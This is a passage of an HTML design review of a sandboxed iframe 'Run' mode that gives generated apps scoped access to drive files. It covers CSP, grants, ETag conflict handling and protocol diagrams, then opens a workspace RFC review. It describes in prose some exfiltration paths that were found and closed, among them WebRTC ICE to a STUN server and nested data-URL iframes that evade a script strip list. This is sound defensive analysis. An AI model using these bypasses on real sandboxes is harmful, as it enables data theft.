relaxation is an egress decision rather than a convenience one — “let apps load a chart library from a CDN” reopens this, which is exactly why the library shelf inlines pinned builds at assembly instead.</p><p><b>And then WebRTC.</b> ICE is not a fetch, so no CSP value governs it: a peer connection reached a public STUN server from inside this exact sandbox while every HTTP channel was blocked, and <code>webrtc 'block'</code> in a <code>&lt;meta&gt;</code> policy did nothing. Closed in the stub, which runs before app code.</p><p><b>And then Preview.</b> Everything above is Run. The Preview tab renders ordinary drive HTML with <code>allow-popups</code> still set, and the reason that was thought safe is that it strips every agent script. The strip list never covered <code>&lt;iframe src="data:text/html,…"&gt;</code> — it only clears <code>srcdoc</code> — and the nested context inherits <code>allow-scripts</code>, so its script runs after the outer document has none left. Preview injected no CSP at all, so that script could simply <code>fetch</code> anywhere; the request arrived at a listening server with its query string intact. <code>&lt;object data="data:…"&gt;</code> and <code>&lt;embed&gt;</code> open the same door, so a longer strip list would have moved the vector rather than closed it. <code>PREVIEW_CSP</code> denies the capability instead: <code>frame-src</code> and <code>object-src 'none'</code> stop the nested contexts, <code>default-src 'none'</code> covers <code>connect-src</code>. It stays wider than <code>RUN_CSP</code> on <code>style-src</code>, <code>img-src</code> and <code>font-src</code>, because preview leaves external URLs alone and drive HTML that links a remote stylesheet or image has to keep rendering.</p><p>Three exits, each found by thinking of one more — and the third in the mode that looked least interesting. <b>Enumerating exits against a browser does not terminate</b>, which is why this list is a record of what is closed and never a proof that nothing is open — and why the folder rule is now enforced server-side as well. An app that cannot obtain bytes outside its folder makes the exit list stop being load-bearing. The list still matters, because an app can always leak the folder you granted it; the prefix check is what bounds the damage to what the person chose to show it.</p></div></div>
+  <div class="finding"><span class="sev i">6</span><div><b>Grant lifetime: keyed by folder and access level, remembered per browser session.</b><p>The grant does not vouch for a program; it says "code from this folder may read, or read and write, this folder", and any program running under it can reach exactly those files. So key it by <code>mountId + folder + level</code> in a module map, mirror it to <code>sessionStorage</code> so a reload does not re-prompt, and never write it into the persisted workspace layout. It survives edits to the app, which matters because the agent rewrites the file every turn during creation. Ask again only when the entry moves to another folder, when the app needs a higher level than granted, or when the browser session ends. The RFC already insists layout restore must not authorize execution; this satisfies it.</p></div></div>
+  <div class="finding"><span class="sev i">7</span><div><b>Close the loop back to the agent.</b><p>After a successful write, bump the drive generation (<code>useDriveGeneration</code> exists) so the explorer, file cards and the agent's next read all see the new bytes. Without this the Files pane shows a stale <code>board.json</code> next to a board that just changed.</p></div></div>
+  <div class="finding"><span class="sev w">9</span><div><b>Writes are unconditional at every layer. Add conflict detection, on by default.</b><p>The mounts API replaces an object without looking at what is there. The bridge inherits that, so the agent and an app can silently overwrite each other's <code>board.json</code>. The fix is optimistic concurrency: reads return an ETag, writes carry <code>If-Match</code>, a mismatch is a 412 with the current ETag. The bridge stub remembers the ETag of every file it read and sends it on every write without the app author doing anything; a rejected write surfaces as <code>{code: "conflict"}</code>. The agent's own writes go through the mounted filesystem, not the API, so they stay unconditional in v1; the app side still catches every collision because its write fails when the agent wrote in between. Store note: the bundled SeaweedFS bucket already has versioning enabled with a retention window, so file history exists at the store and can be exposed later.</p></div></div>
+<div class="finding"><span class="sev i">8</span><div><b>Put the headless part in <code>@agenta/entities</code>, the UI in <code>@agenta/entity-ui</code>.</b><p>Path normalization, the grant store and the request handler are pure logic and want unit tests. The Run segment, the grant prompt and the iframe stay in <code>renderers.tsx</code>. Since <code>DriveFileBody</code> is what both hosts render, mobile gets Run mode with no host work.</p></div></div>
+
+  <h3>Conflict detection, end to end</h3>
+  <figure>
+    <svg viewBox="0 0 960 300" role="img" aria-label="Sequence: the app reads board.json and the reply carries ETag A, which the stub caches. The agent writes board.json through its mount; the object now has ETag B. The user drops a card; the app writes with If-Match A; the API answers 412 with ETag B; the stub rejects with code conflict. The app re-reads, gets ETag B and the agent's change, reapplies the drop, writes with If-Match B, and the API answers 200 with ETag C.">
+      <defs><marker id="arwc" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="8" markerHeight="8" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="currentColor"/></marker></defs>
+      <g font-size="12" fill="currentColor" font-weight="600">
+        <rect x="30" y="14" width="120" height="30" rx="4" fill="none" stroke="currentColor"/><text x="90" y="34" text-anchor="middle">App + stub</text>
+        <rect x="330" y="14" width="120" height="30" rx="4" fill="none" stroke="currentColor"/><text x="390" y="34" text-anchor="middle">Mounts API</text>
+        <rect x="630" y="14" width="120" height="30" rx="4" fill="none" stroke="currentColor"/><text x="690" y="34" text-anchor="middle">board.json</text>
+        <rect x="830" y="14" width="110" height="30" rx="4" fill="none" stroke="currentColor" stroke-dasharray="4 3"/><text x="885" y="34" text-anchor="middle">Agent</text>
+      </g>
+      <g stroke="currentColor" stroke-dasharray="3 4" opacity=".45"><line x1="90" y1="44" x2="90" y2="290"/><line x1="390" y1="44" x2="390" y2="290"/><line x1="690" y1="44" x2="690" y2="290"/><line x1="885" y1="44" x2="885" y2="290"/></g>
+      <g font-size="11" fill="currentColor">
+        <line x1="90" y1="70" x2="390" y2="70" stroke="currentColor" marker-end="url(#arwc)"/><text x="240" y="63" text-anchor="middle">read board.json</text>
+        <line x1="390" y1="92" x2="90" y2="92" stroke="currentColor" marker-end="url(#arwc)"/><text x="240" y="85" text-anchor="middle" font-family="IBM Plex Mono, monospace">200 · ETag A · stub caches A</text>
+        <line x1="885" y1="120" x2="690" y2="120" stroke="currentColor" stroke-dasharray="4 3" marker-end="url(#arwc)"/><text x="790" y="113" text-anchor="middle">agent writes via mount</text>
+        <text x="690" y="140" text-anchor="middle" font-family="IBM Plex Mono, monospace" opacity=".8">now ETag B</text>
+        <line x1="90" y1="166" x2="390" y2="166" stroke="var(--accent)" stroke-width="1.5" marker-end="url(#arwc)"/><text x="240" y="159" text-anchor="middle" font-family="IBM Plex Mono, monospace">PUT · If-Match: A</text>
+        <line x1="390" y1="188" x2="90" y2="188" stroke="var(--crit)" stroke-width="1.5" marker-end="url(#arwc)"/><text x="240" y="181" text-anchor="middle" fill="var(--crit)" font-family="IBM Plex Mono, monospace">412 · ETag B → {code:"conflict"}</text>
+        <line x1="90" y1="216" x2="390" y2="216" stroke="currentColor" marker-end="url(#arwc)"/><text x="240" y="209" text-anchor="middle">re-read · gets B and the agent's change</text>
+        <text x="90" y="238" text-anchor="start" opacity=".8">reapply the drop on top</text>
+        <line x1="90" y1="258" x2="390" y2="258" stroke="var(--accent)" stroke-width="1.5" marker-end="url(#arwc)"/><text x="240" y="251" text-anchor="middle" font-family="IBM Plex Mono, monospace">PUT · If-Match: B</text>
+        <line x1="390" y1="280" x2="90" y2="280" stroke="var(--ok)" stroke-width="1.5" marker-end="url(#arwc)"/><text x="240" y="273" text-anchor="middle" fill="var(--ok)" font-family="IBM Plex Mono, monospace">200 · ETag C</text>
+      </g>
+    </svg>
+    <figcaption>The app author wrote <code>writeJSON</code> and a small retry. The stub supplied <code>If-Match</code> from its cache; the parent forwarded the header; the API compared. Nobody's change was lost. Without this, the drop would have erased the agent's edit.</figcaption>
+  </figure>
+  <p>Three layers, each small. <b>API</b>: read and list responses carry <code>etag</code>; PUT and DELETE accept <code>If-Match</code> and <code>If-None-Match: *</code>; mismatch is 412 with the current ETag. Use the store's native conditional put where available (S3 and current MinIO support it), otherwise stat-compare-put in the service, which narrows the race to milliseconds and is honest about it. <b>Bridge</b>: the stub caches ETag per path on every read, sends it on every write and remove unless <code>{force: true}</code>, and rejects with <code>conflict</code>; a file never read is written unconditionally. <b>Agent</b>: unconditional in v1, since its tools go through the mounted filesystem; the skill tells it to read a data file right before writing it. A conditional write tool for agents is the v2 that closes the last side.</p>
+
+  <h3>Refresh, designed in from the start</h3>
+  <p>"The app cannot fetch anything" is the security model, and it stays. But "the data is stale until someone remembers" is a product problem, and it has four answers of increasing reach. The first two ship early; the last two are designed now so the manifest and the grant prompt never have to change to admit them.</p>
+  <div class="tbl"><table>
+    <thead><tr><th>Tier</th><th>What</th><th>New reach for the app</th><th>Needs</th><th>When</th></tr></thead>
+    <tbody>
+      <tr><td><b>0</b></td><td><b>Change hint.</b> The parent posts <code>{type: "changed", paths}</code> over the port when the drive generation bumps. <b><code>fs.stat(path)</code></b> returns etag and mtime so "data as of" is real</td><td>None. It learns its own folder changed</td><td>Drive generation the parent already tracks; a list diff for paths; the same port as visibility</td><td class="ok">Phase 1</td></tr>
+      <tr><td><b>1</b></td><td><b>Ask the agent.</b> The manifest declares <code>"refresh": {"prompt": "…"}</code>; the Run tab's Refresh control gains "Ask agent to refresh data", which drafts that sentence into the composer via <code>chat.draft</code>. If a schedule feeds the folder, the control shows "next refresh Mon 09:00 UTC"</td><td>None. Parent chrome; the user presses Send</td><td><code>chat.draft</code>; reading the trigger entity for the schedule</td><td class="wn">v1.1, surfaces reserved in v1</td></tr>
+      <tr><td><b>2</b></td><td><b>Proxied read-only tool call.</b> <code>agenta.tools.call(name, args)</code> forwarded by the parent to the existing <code>call_tool</code> endpoint as the user, only for actions whose <code>read_only</code> annotation is true and only if named in the manifest's <code>tools</code> allowlist</td><td>Read from the user's connected accounts, on screen only; still no network</td><td>Manifest <code>tools</code>; a third line in the grant prompt; the read-only rule enforced parent-side and server-side; per-call audit in the existing tool logs</td><td class="cr">Designed, not scheduled</td></tr>
+      <tr><td><b>3</b></td><td><b>App calls a model.</b> A proxied completion from generated code</td><td>Spends the user's budget without an agent in the loop</td><td>Budget, consent, and a reason draft-to-composer does not cover</td><td class="cr">Planning only</td></tr>
+    </tbody>
+  </table></div>
+
+  <figure>
+    <svg viewBox="0 0 960 250" role="img" aria-label="Run tab chrome mockup: the status strip with Running, read and write, data as of Mon 09:00, and a Refresh control opened as a menu with three rows: Reload files, available in v1; Ask agent to refresh data, drafts the manifest's refresh prompt, v1.1; Next scheduled refresh Mon 09:00 UTC, read from the trigger, v1.1. Beside it, the grant prompt with a third, greyed slot: This app can read from Linear as you, reserved for tier 2.">
+      <rect x="0" y="0" width="960" height="250" rx="8" fill="var(--sunken)"/>
+      <g font-size="11" fill="currentColor">
+        <rect x="12" y="12" width="580" height="30" rx="6" fill="var(--surface)" stroke="var(--line)"/>
+        <circle cx="28" cy="27" r="4" fill="var(--ok)"/><text x="38" y="31">Running · read + write · apps/metrics/</text>
+        <text x="300" y="31" opacity=".7">data as of Mon 09:00 · via fs.stat</text>
+        <rect x="500" y="17" width="82" height="20" rx="5" fill="var(--accent)" opacity=".2"/><rect x="500" y="17" width="82" height="20" rx="5" fill="none" stroke="var(--accent)"/><text x="541" y="31" text-anchor="middle" font-weight="500">↻ Refresh ▾</text>
+        <!-- menu -->
+        <rect x="372" y="48" width="220" height="112" rx="6" fill="var(--surface)" stroke="var(--line-strong)"/>
+        <rect x="378" y="54" width="208" height="28" rx="4" fill="var(--accent)" opacity=".12"/>
+        <text x="388" y="72" font-weight="500">Reload files</text><text x="580" y="72" text-anchor="end" opacity=".6" font-size="10">v1</text>
+        <text x="388" y="104" font-weight="500">Ask agent to refresh data</text><text x="580" y="104" text-anchor="end" opacity=".6" font-size="10">v1.1</text>
+        <text x="388" y="118" opacity=".6" font-size="10">drafts: "Regenerate weekly.csv from analytics"</text>
+        <line x1="378" y1="128" x2="586" y2="128" stroke="var(--line)"/>
+        <text x="388" y="148" opacity=".8">Next scheduled refresh · Mon 09:00 UTC</text><text x="580" y="148" text-anchor="end" opacity=".6" font-size="10">v1.1</text>
+        <!-- changed hint -->
+        <rect x="12" y="180" width="580" height="56" rx="6" fill="var(--surface)" stroke="var(--line)"/>
+        <text x="24" y="200" font-weight="600">Tier 0, no click at all</text>
+        <text x="24" y="218" opacity=".8" font-family="IBM Plex Mono, monospace" font-size="10">port ← {type:"changed", paths:["weekly.csv"]}   app re-reads if nothing is pending locally</text>
+        <!-- grant prompt -->
+        <rect x="620" y="12" width="328" height="224" rx="8" fill="var(--surface)" stroke="var(--line-strong)"/>
+        <text x="636" y="36" font-weight="600" font-size="13">Run dashboard?</text>
+        <text x="636" y="56" opacity=".75">This app can use files in</text><text x="770" y="56" font-family="IBM Plex Mono, monospace" font-size="10">apps/metrics/</text>
+        <circle cx="646" cy="84" r="6" fill="none" stroke="var(--accent)" stroke-width="1.5"/><circle cx="646" cy="84" r="3" fill="var(--accent)"/><text x="662" y="88" font-weight="500">Read files</text>
+        <circle cx="646" cy="112" r="6" fill="none" stroke="currentColor"/><text x="662" y="116" font-weight="500">Read and write files</text>
+        <line x1="636" y1="134" x2="932" y2="134" stroke="var(--line)"/>
+        <g opacity=".4">
+          <rect x="640" y="146" width="12" height="12" rx="3" fill="none" stroke="currentColor"/><text x="662" y="156" font-weight="500">Read from Linear as you</text>
+          <text x="662" y="170" font-size="10">read-only actions only · reserved slot, tier 2</text>
+        </g>
+        <rect x="796" y="196" width="60" height="24" rx="5" fill="none" stroke="var(--line-strong)"/><text x="826" y="212" text-anchor="middle">Cancel</text>
+        <rect x="866" y="196" width="66" height="24" rx="5" fill="var(--accent)"/><text x="899" y="212" text-anchor="middle" fill="#fff" font-weight="500">Run</text>
+      </g>
+    </svg>
+    <figcaption>What "designed into initial requirements" means concretely: the Refresh control is a menu from day one with one item, the grant prompt has a third section that stays hidden until tier 2 exists, and the manifest parses <code>refresh</code> and <code>tools</code> from v1 even though v1 acts on neither.</figcaption>
+  </figure>
+
+  <h4>Tier 2, the shape written down</h4>
+  <ul>
+    <li><b>Manifest:</b> <code>"tools": ["linear.list_issues", "agenta.analytics.query"]</code>. Fully qualified action names as the tools catalogue lists them. Parsed and ignored in v1.</li>
+    <li><b>Rule:</b> only actions whose catalogue entry has <code>read_only: true</code> may appear. The parent refuses others when building the grant; the server refuses them again at <code>call_tool</code>. A manifest that lists a write action shows an error in the Run tab and runs without tools.</li>
+    <li><b>Grant:</b> a third section, one checkbox per connection, default off, listing the actions. Stored with the folder grant, same lifetime.</li>
+    <li><b>Call path:</b> <code>agenta.tools.call(name, args)</code> → port → parent checks allowlist and grant → existing <code>call_tool</code> as the user → result over the port. Same id matching and error shape as <code>fs</code>; new codes <code>tool_denied</code>, <code>tool_failed</code>.</li>
+    <li><b>Audit:</b> the existing tool call logs record the caller as "app &lt;path&gt; in session &lt;id&gt;" so a connection owner can see what an app read.</li>
+    <li><b>Out of scope even then:</b> write actions, arbitrary HTTP, and anything not in the catalogue.</li>
+  </ul>
+  <p class="small">Tier 3 has no shape to reserve. If an app ever needs a model, the draft-to-composer path gives the agent the request, and the agent is the thing with a budget and a system prompt.</p>
+
+  <h3>What is Mahmoud's and what this review adds</h3>
+  <p>The proxy design itself, an iframe with no credentials sending file requests to the parent, which validates and calls the API as the user, is PR #6529 as written. The table separates that from the amendments above so nobody mistakes the review for a redesign.</p>
+  <div class="tbl"><table>
+    <thead><tr><th>From #6529 as proposed</th><th>Amended or added by this review</th></tr></thead>
+    <tbody>
+      <tr><td>Run as a third view beside Preview and Source, off by default</td><td>Ship read and write together behind one grant prompt, instead of a read-only first slice</td></tr>
+      <tr><td>A <code>window.*</code> bridge injected first, with <code>ready</code>, <code>canWrite</code>, and <code>fs.read/readJSON/write/writeJSON/list/exists/remove</code></td><td>Name it <code>window.agenta</code>; freeze the error-code set as part of v1</td></tr>
+      <tr><td>Each method posts to the parent; the parent validates source, scope, path and access, then calls the mounts API</td><td>Carry it over a MessageChannel port so the source check and remount invalidation come for free</td></tr>
+      <tr><td>No token, cookie, axios instance or raw fetch ever enters the iframe</td><td>Unchanged</td></tr>
+      <tr><td>Folder scope with client-side normalization; "the server remains the final authorization boundary"</td><td>Amended twice. First to "the server bounds the mount, not the folder; folder scope is a guardrail". Then back, once popups and WebRTC showed a guardrail cannot carry that weight: the folder is a server boundary again, as a prefix-scoped token (<code>core/apps/scope_token.py</code>) checked on every file call. #6529 was right; the reason it was right is not the one it gave.</td></tr>
+      <tr><td>Existing sandbox flags as the starting point, popups questioned</td><td>Drop both popup flags, add <code>allow-forms</code>, inject a CSP meta blocking external scripts and form actions</td></tr>
+      <tr><td>Grant lifetime left as an open question</td><td>Keyed by folder and access level, mirrored to <code>sessionStorage</code>, survives edits, never in the persisted layout</td></tr>
+      <tr><td>Writes replace unconditionally; concurrency not discussed</td><td>ETag on reads, <code>If-Match</code> on writes, 412 on mismatch; the stub sends it automatically and surfaces <code>conflict</code></td></tr>
+      <tr><td>Bridge module next to the renderer in <code>entity-ui</code></td><td>Headless part in <code>@agenta/entities/drive</code> for unit tests; UI stays in <code>renderers.tsx</code>; bump drive generation after writes</td></tr>
+    </tbody>
+  </table></div>
+
+  <h3>Protocol, step by step</h3>
+  <figure>
+    <svg viewBox="0 0 960 420" role="img" aria-label="Sequence: the parent posts a hello with a MessageChannel port into the iframe; the stub resolves ready; app code calls fs.writeJSON; the stub sends a request with an id over the port; the parent checks port, grant, path and size, calls the mounts API, and returns a result keyed by the same id; the stub resolves the promise.">
+      <defs>
+        <marker id="arw5" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="8" markerHeight="8" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="currentColor"/></marker>
+      </defs>
+      <g font-size="12" fill="currentColor" font-weight="600">
+        <rect x="40" y="16" width="140" height="32" rx="4" fill="none" stroke="currentColor"/><text x="110" y="37" text-anchor="middle">App code</text>
+        <rect x="260" y="16" width="140" height="32" rx="4" fill="var(--accent)" opacity=".15"/><rect x="260" y="16" width="140" height="32" rx="4" fill="none" stroke="var(--accent)"/><text x="330" y="37" text-anchor="middle">Bridge stub</text>
+        <rect x="530" y="16" width="140" height="32" rx="4" fill="var(--accent)" opacity=".15"/><rect x="530" y="16" width="140" height="32" rx="4" fill="none" stroke="var(--accent)"/><text x="600" y="37" text-anchor="middle">Parent host</text>
+        <rect x="780" y="16" width="140" height="32" rx="4" fill="none" stroke="currentColor"/><text x="850" y="37" text-anchor="middle">Mounts API</text>
+      </g>
+      <g stroke="currentColor" stroke-dasharray="3 4" opacity=".5">
+        <line x1="110" y1="48" x2="110" y2="400"/><line x1="330" y1="48" x2="330" y2="400"/><line x1="600" y1="48" x2="600" y2="400"/><line x1="850" y1="48" x2="850" y2="400"/>
+      </g>
+      <line x1="460" y1="48" x2="460" y2="400" stroke="var(--crit)" stroke-width="1.5" stroke-dasharray="6 4"/>
+      <text x="460" y="414" font-size="11" text-anchor="middle" fill="var(--crit)">iframe boundary</text>
+      <g font-size="11" fill="currentColor">
+        <line x1="600" y1="80" x2="330" y2="80" stroke="currentColor" marker-end="url(#arw5)"/>
+        <text x="465" y="72" text-anchor="middle">1  hello {version:1, dir, canWrite} + port2 (transfer)</text>
+        <line x1="330" y1="108" x2="110" y2="108" stroke="currentColor" marker-end="url(#arw5)"/>
+        <text x="220" y="100" text-anchor="middle">2  agenta.ready resolves</text>
+        <line x1="110" y1="146" x2="330" y2="146" stroke="currentColor" marker-end="url(#arw5)"/>
+        <text x="220" y="138" text-anchor="middle" font-family="IBM Plex Mono, monospace">3  fs.writeJSON("board.json", v)</text>
+        <line x1="330" y1="174" x2="600" y2="174" stroke="var(--accent)" stroke-width="1.5" marker-end="url(#arw5)"/>
+        <text x="465" y="166" text-anchor="middle" font-family="IBM Plex Mono, monospace">4  port: {id:7, method:"write", path, body}</text>
+        <rect x="520" y="192" width="160" height="78" rx="4" fill="currentColor" opacity=".08"/>
+        <text x="530" y="209">5  port is ours?</text>
+        <text x="530" y="225">   grant allows write?</text>
+        <text x="530" y="241">   path inside app dir?</text>
+        <text x="530" y="257">   size under cap?</text>
+        <line x1="600" y1="292" x2="850" y2="292" stroke="currentColor" marker-end="url(#arw5)"/>
+        <text x="725" y="284" text-anchor="middle" font-family="IBM Plex Mono, monospace">6  PUT /mounts/{id}/files?path=…</text>
+        <line x1="850" y1="318" x2="600" y2="318" stroke="currentColor" marker-end="url(#arw5)"/>
+        <text x="725" y="310" text-anchor="middle" font-family="IBM Plex Mono, monospace">7  200 {path, size}</text>
+        <line x1="600" y1="352" x2="330" y2="352" stroke="var(--accent)" stroke-width="1.5" marker-end="url(#arw5)"/>
+        <text x="465" y="344" text-anchor="middle" font-family="IBM Plex Mono, monospace">8  port: {id:7, ok:true, result}</text>
+        <text x="700" y="366" font-size="10" opacity=".7">+ bump drive generation</text>
+        <line x1="330" y1="384" x2="110" y2="384" stroke="currentColor" marker-end="url(#arw5)"/>
+        <text x="220" y="376" text-anchor="middle">9  promise resolves</text>
+      </g>
+    </svg>
+    <figcaption>One write, end to end. A rejection at step 5 short-circuits to step 8 with <code>{ok:false, error:{code}}</code> and never reaches the API. Requests are matched by id, so the stub can have several in flight.</figcaption>
+  </figure>
+
+  <figure>
+    <svg viewBox="0 0 960 230" role="img" aria-label="Run mode states: Preview by default; choosing Run opens a grant prompt; the grant leads to Run read-only or Run read and write; Refresh re-assembles under the same grant; an app that needs write while granted read returns to the prompt; unmounting closes the port and a remount resumes under the stored grant without a prompt; Cancel returns to Preview.">
+      <defs>
+        <marker id="arw6" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="8" markerHeight="8" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="currentColor"/></marker>
+      </defs>
+      <g font-size="12" fill="currentColor">
+        <rect x="20" y="86" width="130" height="50" rx="6" fill="none" stroke="currentColor"/>
+        <text x="85" y="107" text-anchor="middle" font-weight="600">Preview</text><text x="85" y="124" text-anchor="middle" opacity=".7">default, scripts stripped</text>
+        <rect x="250" y="86" width="150" height="50" rx="6" fill="none" stroke="currentColor"/>
+        <text x="325" y="107" text-anchor="middle" font-weight="600">Grant prompt</text><text x="325" y="124" text-anchor="middle" opacity=".7">read · read+write · cancel</text>
+        <rect x="520" y="26" width="170" height="50" rx="6" fill="var(--accent)" opacity=".15"/><rect x="520" y="26" width="170" height="50" rx="6" fill="none" stroke="var(--accent)" stroke-width="1.5"/>
+        <text x="605" y="47" text-anchor="middle" font-weight="600">Run · read</text><text x="605" y="64" text-anchor="middle" opacity=".7">write → {code:"read_only"}</text>
+        <rect x="520" y="146" width="170" height="50" rx="6" fill="var(--accent)" opacity=".15"/><rect x="520" y="146" width="170" height="50" rx="6" fill="none" stroke="var(--accent)" stroke-width="1.5"/>
+        <text x="605" y="167" text-anchor="middle" font-weight="600">Run · read + write</text><text x="605" y="184" text-anchor="middle" opacity=".7">needs EDIT_MOUNTS</text>
+        <rect x="800" y="86" width="140" height="50" rx="6" fill="none" stroke="currentColor" stroke-dasharray="5 4"/>
+        <text x="870" y="107" text-anchor="middle" font-weight="600">Port closed</text><text x="870" y="124" text-anchor="middle" opacity=".7">tab moved or closed</text>
+      </g>
+      <g font-size="11" fill="currentColor">
+        <line x1="150" y1="111" x2="250" y2="111" stroke="currentColor" marker-end="url(#arw6)"/><text x="200" y="103" text-anchor="middle">user picks Run</text>
+        <path d="M400 104 C 460 104, 470 51, 520 51" fill="none" stroke="currentColor" marker-end="url(#arw6)"/><text x="455" y="70" text-anchor="middle">read</text>
+        <path d="M400 118 C 460 118, 470 171, 520 171" fill="none" stroke="currentColor" marker-end="url(#arw6)"/><text x="455" y="158" text-anchor="middle">read + write</text>
+        <path d="M325 136 C 325 190, 180 190, 150 130" fill="none" stroke="currentColor" marker-end="url(#arw6)"/><text x="235" y="194" text-anchor="middle">cancel</text>
+        <path d="M690 51 C 760 51, 780 86, 800 100" fill="none" stroke="currentColor" marker-end="url(#arw6)"/>
+        <path d="M690 171 C 760 171, 780 136, 800 122" fill="none" stroke="currentColor" marker-end="url(#arw6)"/>
+        <text x="760" y="66" text-anchor="middle">unmount</text>
+        <path d="M870 86 C 870 10, 720 8, 690 26" fill="none" stroke="currentColor" stroke-dasharray="4 3" marker-end="url(#arw6)"/><text x="800" y="14" text-anchor="middle">remount: stored grant, no prompt</text>
+        <path d="M560 26 C 545 6, 600 2, 605 26" fill="none" stroke="currentColor" marker-end="url(#arw6)"/><text x="580" y="12" text-anchor="middle" font-size="10">Refresh</text>
+        <path d="M560 196 C 545 218, 600 222, 605 196" fill="none" stroke="currentColor" marker-end="url(#arw6)"/><text x="580" y="222" text-anchor="middle" font-size="10">Refresh</text>
+        <path d="M520 160 C 470 160, 430 136, 400 130" fill="none" stroke="var(--warn)" stroke-dasharray="4 3" marker-end="url(#arw6)"/><text x="470" y="128" text-anchor="middle" fill="var(--warn)" font-size="10">needs write, granted read</text>
+      </g>
+    </svg>
+    <figcaption>Grant lifecycle. The grant is keyed by mount, folder and access level, in memory and mirrored to sessionStorage; a remount reuses it, and so does an edited file. Only a higher access request or a new folder asks again. Layout restore never enters Run on its own.</figcaption>
+  </figure>
+
+  <h3>What each boundary stops</h3>
+  <figure>
+    <svg viewBox="0 0 960 250" role="img" aria-label="Three boundaries side by side. The sandboxed iframe stops access to the parent page, cookies, storage and external scripts. The parent bridge host stops unknown ports, unknown methods, paths outside the app folder, writes without a grant and oversized bodies. The server stops users without mount permission, mounts outside the project, any path with dot-dot, and anything outside the granted folder. The parent does not stop a bug in its own path check, but the server now bounds the folder as well as the mount, so that bug is no longer load-bearing.">
+      <g font-size="12" fill="currentColor">
+        <rect x="20" y="20" width="290" height="190" rx="6" fill="none" stroke="var(--crit)" stroke-width="1.5" stroke-dasharray="6 4"/>
+        <text x="36" y="44" font-weight="600">1 · Sandboxed iframe</text>
+        <text x="36" y="62" font-size="11" opacity=".7">opaque origin + CSP meta</text>
+        <text x="36" y="90" font-size="11">stops: parent DOM, cookies, storage</text>
+        <text x="36" y="108" font-size="11">stops: any token or axios instance</text>
+        <text x="36" y="126" font-size="11">stops: external &lt;script src&gt;</text>
+        <text x="36" y="144" font-size="11">stops: popups escaping the sandbox</text>
+        <text x="36" y="190" font-size="11" fill="var(--warn)">allows: inline scripts, forms, inlined assets</text>
+
+        <rect x="335" y="20" width="290" height="190" rx="6" fill="none" stroke="var(--accent)" stroke-width="1.5"/>
+        <text x="351" y="44" font-weight="600">2 · Parent bridge host</text>
+        <text x="351" y="62" font-size="11" opacity=".7">HtmlBody, user's credentials</text>
+        <text x="351" y="90" font-size="11">stops: messages not on our port</text>
+        <text x="351" y="108" font-size="11">stops: methods outside the v1 contract</text>
+        <text x="351" y="126" font-size="11">stops: paths outside the app folder</text>
+        <text x="351" y="144" font-size="11">stops: writes without a write grant</text>
+        <text x="351" y="162" font-size="11">stops: bodies over the size cap</text>
+        <text x="351" y="190" font-size="11" fill="var(--warn)">does not stop: a bug in its own path check</text>
+
+        <rect x="650" y="20" width="290" height="190" rx="6" fill="none" stroke="currentColor" stroke-width="1.5"/>
+        <text x="666" y="44" font-weight="600">3 · Server</text>
+        <text x="666" y="62" font-size="11" opacity=".7">mounts router + service</text>
+        <text x="666" y="90" font-size="11">stops: users without VIEW / EDIT_MOUNTS</text>
+        <text x="666" y="108" font-size="11">stops: mounts outside the project</text>
+        <text x="666" y="126" font-size="11">stops: absolute paths, "..", control chars</text>
+        <text x="666" y="144" font-size="11">stops: anything outside the mount</text>
+        <text x="666" y="162" font-size="11">stops: anything outside the granted folder</text>
+        <text x="666" y="190" font-size="11" fill="var(--warn)">does not stop: the app leaking the folder you granted</text>
+      </g>
+      <text x="480" y="238" font-size="11" text-anchor="middle" fill="currentColor" opacity=".7">Worst case if boundary 2 fails: nothing new. The prefix-scoped token makes boundary 3 hold the folder too, so a bug in the parent's path check is no longer load-bearing.</text>
+    </svg>
+    <figcaption>The folder is a server boundary, not a guardrail. Boundary 1 is what makes an App safe; boundary 3 is what makes a bug in boundary 2 survivable — which is the whole reason the folder rule was moved onto it.</figcaption>
+  </figure>
+</section>
+
+<section id="workspace">
+  <h2>Review: PR #6775, the workspace PRD and RFC</h2>
+  <p>The RFC reads the current architecture correctly and its layer model is the one worth keeping. The issues are scope and host coverage, not direction.</p>
+
+  <figure>
+    <svg viewBox="0 0 960 250" role="img" aria-label="Four layers: the workspace owns pane layout and tab order; tab views own presentation; resource state owns sessions and files; the runtime registry owns live chat clients. A tab id points at a resource id; moving a tab changes only the workspace layer.">
+      <defs>
+        <marker id="arw3" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="8" markerHeight="8" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="currentColor"/></marker>
+      </defs>
+      <g font-size="12" fill="currentColor">
+        <rect x="20" y="20" width="560" height="44" rx="4" fill="var(--accent)" opacity=".15"/>
+        <text x="34" y="38" font-weight="600">Workspace</text>
+        <text x="34" y="55" opacity=".75">panes · tab order · selected tab per pane · focused pane · persisted, scoped by chat scope key</text>
+        <rect x="20" y="76" width="560" height="44" rx="4" fill="none" stroke="currentColor" opacity=".7"/>
+        <text x="34" y="94" font-weight="600">Tab view</text>
+        <text x="34" y="111" opacity=".75">renderer registry by kind · title/status · visibility · focus · close · missing-resource recovery</text>
+        <rect x="20" y="132" width="560" height="44" rx="4" fill="none" stroke="currentColor" opacity=".7"/>
+        <text x="34" y="150" font-weight="600">Resource state</text>
+        <text x="34" y="167" opacity=".75">sessionsByApp · sessionMessages · drive queries · grants (never in layout)</text>
+        <rect x="20" y="188" width="560" height="44" rx="4" fill="none" stroke="currentColor" opacity=".7"/>
+        <text x="34" y="206" font-weight="600">Runtime registry</text>
+        <text x="34" y="223" opacity=".75">sessionChats.ts Chat instances · iframe ports · outlive the React view</text>
+      </g>
+      <!-- identity callout -->
+      <rect x="620" y="20" width="320" height="212" rx="6" fill="none" stroke="currentColor" stroke-dasharray="5 4"/>
+      <text x="636" y="44" font-size="12" font-weight="600" fill="currentColor">Two identities, kept apart</text>
+      <rect x="636" y="60" width="130" height="36" rx="4" fill="currentColor" opacity=".08"/>
+      <text x="701" y="77" font-size="11" text-anchor="middle" fill="currentColor" font-family="IBM Plex Mono, monospace">tab: t_8f2</text>
+      <text x="701" y="90" font-size="10" text-anchor="middle" fill="currentColor" opacity=".6">kind=app · pane B</text>
